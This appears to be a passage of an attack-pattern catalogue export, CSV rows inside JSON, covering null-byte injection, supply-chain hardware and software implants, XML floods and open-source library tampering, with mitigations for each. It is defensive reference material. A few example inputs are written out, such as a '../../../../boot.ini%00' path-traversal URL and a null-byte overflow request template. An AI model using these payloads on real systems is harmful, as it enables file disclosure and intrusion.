character]<script></script>%00::Exploitation of a buffer overflow vulnerability in the ActiveX component packaged with Adobe Systems Inc.'s Acrobat/Acrobat Reader allows remote adversaries to execute arbitrary code. The problem specifically exists upon retrieving a link of the following form: GET /any_existing_dir/any_existing_pdf.pdf%00[long string] HTTP/1.1 Where [long string] is a malicious crafted long string containing acceptable URI characters. The request must be made to a web server that truncates the request at the null byte (%00), otherwise an invalid file name is specified and a file not found page will be returned. Example web servers that truncate the requested URI include Microsoft IIS and Netscape Enterprise. Though the requested URI is truncated for the purposes of locating the file the long string is still passed to the Adobe ActiveX component responsible for rendering the page. This in turn triggers a buffer overflow within RTLHeapFree() allowing for an adversary to overwrite an arbitrary word in memory. The responsible instructions from RTLHeapFree() are shown here: 0x77F83AE5 MOV EAX,[EDI+8]0x77F83AE8 MOV ECX,[EDI+C]...0x77F83AED MOV [ECX],EAX The register EDI contains a pointer to a user-supplied string. The adversary therefore has control over both the ECX and EAX registers used in the shown MOV instruction. Successful exploitation allows remote adversaries to utilize the arbitrary word overwrite to redirect the flow of control and eventually take control of the affected system. Code execution will occur under the context of the user that instantiated the vulnerable version of Adobe Acrobat. An adversary does not need to establish a malicious web site as exploitation can occur by adding malicious content to the end of any embedded link and referencing any Microsoft IIS or Netscape Enterprise web server. Clicking on a direct malicious link is also not required as it may be embedded within an IMAGE tag, an IFRAME or an auto-loading script. Successful exploitation requires that a payload be written such that certain areas of the input are URI acceptable. This includes initial injected instructions as well as certain overwritten addresses. This increases the complexity of successful exploitation. While not trivial, exploitation is definitely plausible [REF-445].See also: CVE-2004-0629::Consider the following PHP script: $whatever = addslashes($_REQUEST['whatever']);include(/path/to/program/ . $whatever . /header.htm); A malicious adversary might open the following URL, disclosing the boot.ini file: http://localhost/phpscript.php?whatever=../../../../boot.ini%00::\",\"::158::172::173::74::20::697::707::\",\"TAXONOMY NAME:WASC:ENTRY ID:28:ENTRY NAME:Null Byte Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Embedding Null Code::\",\"\",\n520,\"Counterfeit Hardware Component Inserted During Product Assembly\",Detailed,Draft,\"An adversary with either direct access to the product assembly process or to the supply of subcomponents used in the product assembly process introduces counterfeit hardware components into product assembly. The assembly containing the counterfeit components results in a system specifically designed for malicious purposes.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The adversary will need either physical access or be able to supply malicious hardware components to the product development facility.::\",\"::SKILL:Resources to maliciously construct components used by the manufacturer.:LEVEL:High::SKILL:Resources to physically infiltrate manufacturer or manufacturer's supplier.:LEVEL:High::\",\"\",\"\",\"\",\"::Hardware attacks are often difficult to detect, as inserted components can be difficult to identify or remain dormant for an extended period of time.::Acquire hardware and hardware components from trusted vendors. Additionally, determine where vendors purchase components or if any components are created/acquired via subcontractors to determine where supply chain risks may exist.::\",\"::A manufacturer of a firewall system requires a hardware card which functions as a multi-jack ethernet card with four ethernet ports. The adversary constructs a counterfeit card that functions normally except that packets from the adversary's network are allowed to bypass firewall processing completely. Once deployed at a victim location, this allows the adversary to bypass the firewall unrestricted.::In 2018 it was discovered that Chinese spies infiltrated several U.S. government agencies and corporations as far back as 2015 by including a malicious microchip within the motherboard of servers sold by Elemental Technologies to the victims. Although these servers were assembled via a U.S. based company, the motherboards used within the servers were manufactured and maliciously altered via a Chinese subcontractor. Elemental Technologies then sold these malicious servers to various U.S. government agencies, such as the DoD and CIA, and corporations like Amazon and Apple. The malicious microchip provided adversaries with a backdoor into the system, which further allowed them to access any network that contained the exploited systems, to exfiltrate data to be sent to the Chinese government.[REF-713]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n521,\"Hardware Design Specifications Are Altered\",Detailed,Draft,\"An attacker with access to a manufacturer's hardware manufacturing process documentation alters the design specifications, which introduces flaws advantageous to the attacker once the system is deployed.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:447::\",\"\",\"::Advanced knowledge of hardware capabilities of a manufacturer's product.::Access to the manufacturer's documentation.::\",\"::SKILL:Ability to read, interpret, and subsequently alter manufacturer's documentation to cause errors in design specifications.:LEVEL:High::SKILL:Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.:LEVEL:High::\",\"\",\"\",\"\",\"::Digitize documents and cryptographically sign them to verify authenticity.::Password protect documents and make them read-only for unauthorized users.::Avoid emailing important documents and configurations.::Ensure deleted files are actually deleted.::Maintain backups of the document for recovery and verification.::Separate need-to-know information from system configuration information depending on the user.::\",\"::To operate at full capability, a manufacturer's network intrusion detection device needs to have either a Intel Xeon E7-2820 or AMD FX-8350 which have 8 cores available, allowing for advanced threading needed to handle large volumes of network traffic without resorting to dropping packets from the detection process. The attacker alters the documentation to state that the system design must use the Intel Core Duo or the AMD Phenom II X2, which only have 2 cores, causing the system to drop large amounts of packets during deployment at a victim site with large amounts of network traffic.::\",\"\",\"\",\"\",\n522,\"Malicious Hardware Component Replacement\",Standard,Draft,\"An adversary replaces legitimate hardware in the system with faulty counterfeit or tampered hardware in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:439::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Target Hardware] The adversary must first identify a system that they wish to target, and a specific hardware component that they can swap out with a malicious replacement.:TECHNIQUE:Look for datasheets containing the system schematics that can help identify possible target hardware.:TECHNIQUE:Procure a system and inspect it manually, looking for possible hardware component targets. Search for manufacturer IDs on hardware chips or FCC IDs on wireless chips to determine their functionality.::STEP:2:PHASE:Explore:DESCRIPTION:[Discover Vulnerability in Supply Chain] The adversary maps out the supply chain for the targeted system. They look for ooportunities to gain physical access to the system after it has left the manufacturer, but before it is deployed to the victim.:TECHNIQUE:Procure a system and observe the steps it takes in the shipment process.:TECHNIQUE:Identify possible warehouses that systems are stored after manufacturing.::STEP:3:PHASE:Experiment:DESCRIPTION:[Test a Malicious Component Replacement] Before performing the attack in the wild, an adversary will test the attack on a system they have procured to ensure that the desired outcome will be achieved.:TECHNIQUE:Design a malicious hardware component that will perform the same functionality as the target component, but also contains additional functionality.:TECHNIQUE:Obtain already designed malicious components that just need to be placed into the system.::STEP:3:PHASE:Exploit:DESCRIPTION:[Substitute Components in the Supply Chain] Using the vulnerability in the supply chain of the system discovered in the explore phase, the adversary substitutes the malicious component for the targeted component. This results in the adversary gaining unintended access to systems once they reach the victim and can lead to a variety of follow up attacks.::\",\"::Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.::\",\"::SKILL:Advanced knowledge of the design of the system.:LEVEL:High::SKILL:Hardware creation and manufacture of replacement components.:LEVEL:High::\",\"\",\"\",\"\",\"::Ensure that all contractors and sub-suppliers use trusted means of shipping (e.g., bonded/cleared/vetted and insured couriers) to ensure that components, once purchased, are not subject to compromise during their delivery.::Prevent or detect tampering with critical hardware or firmware components while in transit through use of state-of-the-art anti-tamper devices.::Use tamper-resistant and tamper-evident packaging when shipping critical components (e.g., plastic coating for circuit boards, tamper tape, paint, sensors, and/or seals for cases and containers) and inspect received system components for evidence of tampering.::\",\"::During shipment the adversary is able to intercept a system that has been purchased by the victim, and replaces a math processor card that functions just like the original, but contains advanced malicious capability. Once deployed, the system functions as normal, but allows for the adversary to remotely communicate with the system and use it as a conduit for additional compromise within the victim's environment.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n523,\"Malicious Software Implanted\",Standard,Draft,\"An attacker implants malicious software into the system in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:439::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Entry Point] The adversary must first identify a system that they wish to target and search for an entry point they can use to install the malicious software. This could be a system which they have prior knowledge of, giving them insight into the software and environment.:TECHNIQUE:Use a JTAGulator to identify exposed JTAG and UART interfaces in smaller embedded systems.:TECHNIQUE:Identify exposed USB connectors that could be used to load software.::STEP:2:PHASE:Explore:DESCRIPTION:[Discover Vulnerability in Supply Chain] The adversary maps out the supply chain for the targeted system. They look for ooportunities to gain physical access to the system after it has left the manufacturer, but before it is deployed to the victim.:TECHNIQUE:Procure a system and observe the steps it takes in the shipment process.:TECHNIQUE:Identify possible warehouses that systems are stored after manufacturing.::STEP:3:PHASE:Experiment:DESCRIPTION:[Test Malicious Software] Before performing the attack in the wild, an adversary will test the attack on a system they have procured to ensure that the desired outcome will be achieved.:TECHNIQUE:Design malicious software that will give an adversary a backdoor into the system once it is deployed to the victim.:TECHNIQUE:Obtain already designed malicious software that just need to be placed into the system.::STEP:4:PHASE:Exploit:DESCRIPTION:[Implant Software in the Supply Chain] Using the vulnerability in the supply chain of the system discovered in the explore phase, the adversary implants the malicious software into the system. This results in the adversary gaining unintended access to systems once they reach the victim and can lead to a variety of follow up attacks.::\",\"::Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.::\",\"::SKILL:Advanced knowledge of the design of the system and it's operating system components and subcomponents.:LEVEL:High::SKILL:Malicious software creation.:LEVEL:High::\",\"\",\"\",\"\",\"::Deploy strong code integrity policies to allow only authorized apps to run.::Use endpoint detection and response solutions that can automaticalkly detect and remediate suspicious activities.::Maintain a highly secure build and update infrastructure by immediately applying security patches for OS and software, implementing mandatory integrity controls to ensure only trusted tools run, and requiring multi-factor authentication for admins.::Require SSL for update channels and implement certificate transparency based verification.::Sign everything, including configuration files, XML files and packages.::Develop an incident response process, disclose supply chain incidents and notify customers with accurate and timely information.::\",\"::An attacker has created a piece of malicious software designed to function as a backdoor in a system that is to be deployed at the victim location. During shipment of the system, the attacker has physical access to the system at a loading dock of an integrator for a short time. The attacker unpacks and powers up the system and installs the malicious piece of software, and configures it to run upon system boot. The system is repackaged and returned to its place on the loading dock, and is shipped and installed at the victim location with the malicious software in place, allowing the attacker to bypass firewalls and remotely gain access to the victim's network for further malicious activities.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\","
  },
  "doc-b56d67d47d14abe02cd44e41cc0c4d83": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n524,\"Rogue Integration Procedures\",Standard,Draft,\"An attacker alters or establishes rogue processes in an integration facility in order to insert maliciously altered components into the system. The attacker would then supply the malicious components. This would allow for malicious disruption or additional compromise when the system is deployed.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:439::\",\"\",\"::Physical access to an integration facility that prepares the system before it is deployed at the victim location.::\",\"::SKILL:Advanced knowledge of the design of the system.:LEVEL:High::SKILL:Hardware creation and manufacture of replacement components.:LEVEL:High::\",\"\",\"\",\"\",\"::Deploy strong code integrity policies to allow only authorized apps to run.::Use endpoint detection and response solutions that can automaticalkly detect and remediate suspicious activities.::Maintain a highly secure build and update infrastructure by immediately applying security patches for OS and software, implementing mandatory integrity controls to ensure only trusted tools run, and requiring multi-factor authentication for admins.::Require SSL for update channels and implement certificate transparency based verification.::Sign everything, including configuration files, XML files and packages.::Develop an incident response process, disclose supply chain incidents and notify customers with accurate and timely information.::Maintain strong physical system access controls and monitor networks and physical facilities for insider threats.::\",\"::An attacker gains access to a system integrator's documentation for the preparation of purchased systems designated for deployment at the victim's location. As a part of the preparation, the included 100 megabit network card is to be replaced with a 1 gigabit network card. The documentation is altered to reflect the type of 1 gigabit network card to use, and the attacker ensures that this type of network card is provided by the attacker's own supply. The card has additional malicious functionality which will allow for additional compromise by the attacker at the victim location once the system is deployed.::\",\"\",\"\",\"\",\n528,\"XML Flood\",Standard,Draft,\"An adversary may execute a flooding attack using XML messages with the intent to deny legitimate users access to a web service. These attacks are accomplished by sending a large number of XML based requests and letting the service attempt to parse each one. In many cases this type of an attack will result in a XML Denial of Service (XDoS) due to an application becoming unstable, freezing, or crashing.\",\"::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:125::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.:TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the web service when the XML data sent to the service.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch a resource depletion attack] The attacker delivers a large number of XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.:TECHNIQUE:Send a large number of crafted XML messages to the target URL.::\",\"::The target must receive and process XML transactions.::An adverssary must possess the ability to generate a large amount of XML based messages to send to the target service.::\",\"::SKILL:Denial of service:LEVEL:Low::\",\"\",\"::A large amount of data is passed to the XML parser possibly making it crash or otherwise unavailable to end users.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::\",\"::Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.::Implementation: Provide for network flow control and traffic shaping to control access to the resources.::\",\"::Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.::\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service:Direct Network Flood::\",\"\",\n529,\"Malware-Directed Internal Reconnaissance\",Standard,Stable,\"Adversary uses malware or a similarly controlled application installed inside an organizational perimeter to gather information about the composition, configuration, and security mechanisms of a targeted application, system or network.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have internal, logical access to the target network and system.::\",\"::SKILL:The adversary must be able to obtain or develop, as well as place malicious software inside the target network/system.:LEVEL:Medium::\",\"::The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Keep patches up to date by installing weekly or daily if possible.::Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"\",\"\",\"\",\"\",\n53,\"Postfix, Null Terminate, and Backslash\",Detailed,Draft,\"If a string is passed through a filter of some kind, then a terminal NULL may not be valid. Using alternate representation of NULL allows an adversary to embed the NULL mid-string while postfixing the proper data so that the filter is avoided. One example is a filter that looks for a trailing slash character. If a string insertion is possible, but the slash must exist, an alternate encoding of NULL in mid-string may be used.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects postfix null byte(s) followed by a backslash to observe how the application handles them as input. The adversary is looking for areas where user input is placed in the middle of a string, and the null byte causes the application to stop processing the string at the end of the user input.:TECHNIQUE:Try different encodings for null such as 0 or %00 followed by an encoding for the backslash character.::STEP:3:PHASE:Exploit:DESCRIPTION:[Remove data after null byte(s)] After determined entry points that are vulnerable, the adversary places a null byte(s) followed by a backslash such that they bypass an input filter and remove data after the null byte(s) in a way that is beneficial to them.:TECHNIQUE:If the input is a directory as part of a longer file path, add a null byte(s) followed by a backslash at the end of the input to try to traverse to the given directory.::\",\"::Null terminators are not properly handled by the filter.::\",\"::SKILL:An adversary needs to understand alternate encodings, what the filter looks for and the data format acceptable to the target API:LEVEL:Medium::\",\"\",\"::Null characters are observed by the filter. The filter needs to be able to understand various encodings of the Null character, or only canonical data should be passed to it.::\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Properly handle Null characters. Make sure canonicalization is properly applied. Do not pass Null characters to the underlying APIs.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::\",\"::A rather simple injection is possible in a URL: http://getAccessHostname/sekbin/helpwin.gas.bat?mode=&draw=x&file=x&module=&locale=[insert relative path here][%00][%5C]&chapter= This attack has appeared with regularity in the wild. There are many variations of this kind of attack. Spending a short amount of time injecting against Web applications will usually result in a new exploit being discovered.::\",\"::158::172::173::74::20::697::707::\",\"\",\"\",\n530,\"Provide Counterfeit Component\",Detailed,Draft,\"An attacker provides a counterfeit component during the procurement process of a lower-tier component supplier to a sub-system developer or integrator, which is then built into the system being upgraded or repaired by the victim, allowing the attacker to cause disruption or additional compromise.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:531::\",\"\",\"::Advanced knowledge about the target system and sub-components.::\",\"::SKILL:Able to develop and manufacture malicious system components that resemble legitimate name-brand components.:LEVEL:High::\",\"\",\"\",\"\",\"::There are various methods to detect if the component is a counterfeit. See section II of [REF-703] for many techniques.::\",\"::The attacker, aware that the victim has contracted with an integrator for system maintenance and that the integrator uses commercial-off-the-shelf network hubs, develops their own network hubs with a built-in malicious capability for remote access, the malicious network hubs appear to be a well-known brand of network hub but are not. The attacker then advertises to the sub-system integrator that they are a legit supplier of network hubs, and offers them at a reduced price to entice the integrator to purchase these network hubs. The integrator then installs the attacker's hubs at the victim's location, allowing the attacker to remotely compromise the victim's network.::\",\"\",\"\",\"\",\n531,\"Hardware Component Substitution\",Detailed,Draft,\"An attacker substitutes out a tested and approved hardware component for a maliciously-altered hardware component. This type of attack is carried out directly on the system, enabling the attacker to then cause disruption or additional compromise.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:534::\",\"\",\"::Physical access to the system or the integration facility where hardware components are kept.::\",\"::SKILL:Able to develop and manufacture malicious system components that perform the same functions and processes as their non-malicious counterparts.:LEVEL:High::\",\"\",\"\",\"\",\"\",\"::An attacker has access to an organization's warehouse of card readers being included as a part of an overall security system. By replacing a critical hardware component in the card reader, the attacker is able to alter the function of the card reader to allow an attacker-supplied card to bypass a security checkpoint. The card reader is placed in the warehouse, and later used in the victim's security system. The attacker is then able to go to the victim and use their own card and bypass a physical security checkpoint and gain access to the victim's location for further malicious activity.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n532,\"Altered Installed BIOS\",Detailed,Stable,\"An attacker with access to download and update system software sends a maliciously altered BIOS to the victim or victim supplier/integrator, which when installed allows for future exploitation.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::Advanced knowledge about the installed target system design.::Advanced knowledge about the download and update installation processes.::Access to the download and update system(s) used to deliver BIOS images.::\",\"::SKILL:Able to develop a malicious BIOS image with the original functionality as a normal BIOS image, but with added functionality that allows for later compromise and/or disruption.:LEVEL:High::\",\"\",\"\",\"\",\"::Deploy strong code integrity policies to allow only authorized apps to run.::Use endpoint detection and response solutions that can automaticalkly detect and remediate suspicious activities.::Maintain a highly secure build and update infrastructure by immediately applying security patches for OS and software, implementing mandatory integrity controls to ensure only trusted tools run, and requiring multi-factor authentication for admins.::Require SSL for update channels and implement certificate transparency based verification.::Sign update packages and BIOS patches.::Use hardware security modules/trusted platform modules to verify authenticity using hardware-based cryptography.::\",\"::An attacker compromises the download and update portion of a manufacturer's web presence, and develops a malicious BIOS that in addition to the normal functionality will also at a specific time of day disable the remote access subsystem's security checks. The malicious BIOS is put in place on the manufacturer's website, the victim location is sent an official-looking email informing the victim of the availability of a new BIOS with bug fixes and enhanced performance capabilities to entice the victim to install the new BIOS quickly. The malicious BIOS is downloaded and installed on the victim's system, which allows for additional compromise by the attacker.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1495:ENTRY NAME:Firmware Corruption::::TAXONOMY NAME:ATTACK:ENTRY ID:1542.001:ENTRY NAME:Pre-OS Boot:System Firmware::\",\"\",\n533,\"Malicious Manual Software Update\",Detailed,Draft,\"An attacker introduces malicious code to the victim's system by altering the payload of a software update, allowing for additional compromise or site disruption at the victim location. These manual, or user-assisted attacks, vary from requiring the user to download and run an executable, to as streamlined as tricking the user to click a URL. Attacks which aim at penetrating a specific network infrastructure often rely upon secondary attack methods to achieve the desired impact. Spamming, for example, is a common method employed as an secondary attack vector. Thus the attacker has in their arsenal a choice of initial attack vectors ranging from traditional SMTP/POP/IMAP spamming and its varieties, to web-application mechanisms which commonly implement both chat and rich HTML messaging within the user interface.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:186::\",\"\",\"::Advanced knowledge about the download and update installation processes.::Advanced knowledge about the deployed system and its various software subcomponents and processes.::\",\"::SKILL:Able to develop malicious code that can be used on the victim's system while maintaining normal functionality.:LEVEL:High::\",\"\",\"\",\"\",\"::Only accept software updates from an official source.::\",\"::An email campaign was initiated, targetting victims of a ransomware attack. The email claimed to be a patch to address the ransomware attack, but was instead an attachment that caused the Cobalt Strike tools to be installed, which enabled further attacks.::\",\"::494::\",\"\",\"\",\n534,\"Malicious Hardware Update\",Standard,Stable,\"An adversary introduces malicious hardware during an update or replacement procedure, allowing for additional compromise or site disruption at the victim location. After deployment, it is not uncommon for upgrades and replacements to occur involving hardware and various replaceable parts. These upgrades and replacements are intended to correct defects, provide additional features, and to replace broken or worn-out parts. However, by forcing or tricking the replacement of a good component with a defective or corrupted component, an adversary can leverage known defects to obtain a desired malicious impact.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:440::\",\"\",\"\",\"::SKILL:Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts.:LEVEL:High::\",\"\",\"\",\"\",\"\",\"::An adversary develops a malicious networking card that allows for normal function plus the addition of malicious functionality that is of benefit to the adversary. The adversary sends the victim an email stating that the existing networking card is faulty, and that the victim can order a replacement card free of charge. The victim orders the card, and the adversary sends the malicious networking card. The malicious networking card replaces the perfectly-functioning original networking card, and the adversary is able to take advantage of the additional malicious functionality to further compromise the victim's network.::\",\"\",\"\",\"\",\n535,\"Malicious Gray Market Hardware\",Detailed,Draft,\"An attacker maliciously alters hardware components that will be sold on the gray market, allowing for victim disruption and compromise when the victim needs replacement hardware components for systems where the parts are no longer in regular supply from original suppliers, or where the hardware components from the attacker seems to be a great benefit from a cost perspective.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:531::\",\"\",\"::Physical access to a gray market reseller's hardware components supply, or the ability to appear as a gray market reseller to the victim's buyer.::\",\"::SKILL:Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts.:LEVEL:High::\",\"\",\"\",\"\",\"::Purchase only from authorized resellers.::Validate serial numbers from multiple sources::\",\"::An attacker develops co-processor boards with malicious capabilities that are technically the same as a manufacturer's expensive upgrade to their flagship system. The victim has installed the manufacturer's base system without the expensive upgrade. The attacker contacts the victim and states they have the co-processor boards at a drastically-reduced price, falsely stating they were acquired from a bankruptcy liquidation of a company that had purchased them from the manufacturer. The victim after hearing the drastically reduced price decides to take advantage of the situation and purchases the upgrades from the attacker, and installs them. This allows the attacker to further compromise the victim.::\",\"\",\"\",\"\",\n536,\"Data Injected During Configuration\",Standard,Stable,\"An attacker with access to data files and processes on a victim's system injects malicious data into critical operational data during configuration or recalibration, causing the victim's system to perform in a suboptimal manner that benefits the adversary.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:176::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine configuration process] The adversary, through a previously compromised system, either remotely or physically, determines what the configuration process is. They look at configuration files, data files, and running processes on the system to identify areas where they could inject malicious data.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine when configuration occurs] The adversary needs to then determine when configuration or recalibration of a system occurs so they know when to inject malicious data.:TECHNIQUE:Look for a weekly update cycle or repeated update schedule.:TECHNIQUE:Insert a malicious process into the target system that notifies the adversary when configuration is occurring.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine malicious data to inject] By looking at the configuration process, the adversary needs to determine what malicious data they want to insert and where to insert it.:TECHNIQUE:Add false log data:TECHNIQUE:Change configuration files:TECHNIQUE:Change data files::STEP:4:PHASE:Exploit:DESCRIPTION:[Inject malicious data] Right before, or during system configuration, the adversary injects the malicious data. This leads to the system behaving in a way that is beneficial to the adversary and is often followed by other attacks.::\",\"::The attacker must have previously compromised the victim's systems or have physical access to the victim's systems.::Advanced knowledge of software and hardware capabilities of a manufacturer's product.::\",\"::SKILL:Ability to generate and inject false data into operational data into a system with the intent of causing the victim to alter the configuration of the system.:LEVEL:High::\",\"\",\"\",\"\",\"::Ensure that proper access control is implemented on all systems to prevent unauthorized access to system files and processes.::\",\"::An adversary wishes to bypass a security system to access an additional network segment where critical data is kept. The adversary knows that some configurations of the security system will allow for remote bypass under certain conditions, such as switching a specific parameter to a different value. The adversary knows the bypass will work but also will be detected within the logging data of the security system. The adversary waits until an upgrade is performed to the security system by the victim's system administrators, and the adversary has access to an external logging system. The adversary injects false log entries that cause the administrators to think there are two different error states within the security system - one involving the specific parameter and the other involving the logging entries. The specific parameter is adjusted to a different value, and the logging level is reduced to a lower level that will not cause an adversary bypass to be detected. The adversary stops injecting false log data, and the administrators of the security system believe the issues were caused by the upgrade and are now resolved. The adversary is then able to bypass the security system.::\",\"::284::\",\"\",\"\",\n537,\"Infiltration of Hardware Development Environment\",Detailed,Draft,\"An adversary, leveraging the ability to manipulate components of primary support systems and tools within the development and production environments, inserts malicious software within the hardware and/or firmware development environment. The infiltration purpose is to alter developed hardware components in a system destined for deployment at the victim's organization, for the purpose of disruption or further compromise.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).::The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.::The adversary must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.::\",\"::SKILL:Intelligence about the manufacturer's operating environment and infrastructure.:LEVEL:Medium::SKILL:Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.:LEVEL:High::SKILL:Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc):LEVEL:High::\",\"\",\"\",\"\",\"::Verify software downloads and updates to ensure they have not been modified be adversaries::Leverage antivirus tools to detect known malware::Do not download software from untrusted sources::Educate designers, developers, engineers, etc. on social engineering attacks to avoid downloading malicious software via attacks such as phishing attacks::\",\"::The adversary, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for hardware and/or firmware design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the adversary to remotely compromise the adjacent hardware development system from the manufacturer's workstation. The adversary is then able to exfiltrate and alter sensitive data on the hardware system, allowing for future compromise once the developed system is deployed at the victim location.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n538,\"Open-Source Library Manipulation\",Detailed,Stable,\"Adversaries implant malicious code in open source software (OSS) libraries to have it widely distributed, as OSS is commonly downloaded by developers and other users to incorporate into software development projects. The adversary can have a particular system in mind to target, or the implantation can be the first stage of follow-on attacks on many systems.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine the relevant open-source code project to target] The adversary will make the selection based on various criteria: The open-source code currently in use on a selected target system. The depth in the dependency graph of the open source code in relationship to other code bases in use on the target system. Choosing an OSS lower in the graph decreases the probability of discovery, but also decreases the scope of its use within the target system. The programming language in which the open source code is implemented. Different languages present different opportunities for using known software weaknesses. The quality of processes in place to make a contribution. For instance, some contribution sites use static and dynamic analysis tools, which could increase the probability of discovery. The security requirements necessary to make a contribution. For instance, is the ownership lax allowing unsigned commits or anonymous users.::STEP:2:PHASE:Experiment:DESCRIPTION:[Develop a plan for malicious contribution] The adversary develops a plan to contribute malicious code, taking the following into consideration: The adversary will probably avoid easy-to-find software weaknesses, especially ones that static and dynamic analysis tools are likely to discover. Common coding errors or missing edge cases of the algorithm, which can be explained away as being accidental, if discovered, will be preferred by the adversary. Sometimes no identity is required to make a contribution. Other options are to steal an existing identity or create one. When creating a new identity, strike a balance between too little or too much detail. Using an stolen identity could cause a notification to be sent to the actual user.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute the plan for malicious contribution] Write the code to be contributed based on the plan and then submit the contribution. Multiple commits, possibly using 